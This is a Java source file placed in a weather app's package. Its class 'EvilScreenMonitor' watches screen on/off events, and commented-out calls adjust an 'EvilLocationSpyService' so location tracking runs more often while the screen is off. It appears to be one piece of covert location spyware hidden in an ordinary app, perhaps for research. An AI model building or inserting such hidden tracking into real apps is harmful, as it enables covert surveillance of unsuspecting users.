package cz.martykan.forecastie;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

public class EvilScreenMonitor extends BroadcastReceiver {

    private boolean screenOff;
    private Context context;

    EvilScreenMonitor(Context inContext){
        context = inContext;
    }

    @Override
    public void onReceive(Context context, Intent intent) {

        if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
            screenOff = true;
            Log.d("EvilScreenMonitor", "SCREEN OFF");
            //EvilLocationSpyService.instance.setLocationUpdateThresholds(1 * 60 * 1000, 50);

        } else if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)) {
            screenOff = false;
            Log.d("EvilScreenMonitor", "SCREEN ON");
            //EvilLocationSpyService.instance.setLocationUpdateThresholds(15 * 60 * 1000, 500);
        }

    }

}